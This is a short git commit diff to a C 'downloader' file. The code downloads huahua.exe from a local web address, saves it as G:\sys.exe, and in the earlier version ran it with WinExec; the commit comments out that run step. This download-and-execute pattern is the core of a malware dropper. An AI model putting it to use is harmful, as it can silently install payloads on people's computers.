290fc88ccd749c4f27797ef37f895f4d368cf4b6
Valar Morghulis <524672142@qq.com>
2017-01-31 23:36:13 +0800

    update

--- 12/下载器/下载器/run.c
+++ 12/下载器/下载器/run.c
@@ -5,8 +5,9 @@
 
 #pragma comment(lib,"Urlmon.lib")				//链接库
 
-void main() {
+int main(){
+	printf("%d", add(1, 2));
 	URLDownloadToFileA(NULL, "http://127.0.0.1/huahua.exe", "G:\\sys.exe", 0, NULL);
-	WinExec("G:\\sys.exe", SW_SHOW);			//启动应用程序										
-
+	//WinExec("G:\\sys.exe", SW_SHOW);			//启动应用程序										
+	return 0;
 }
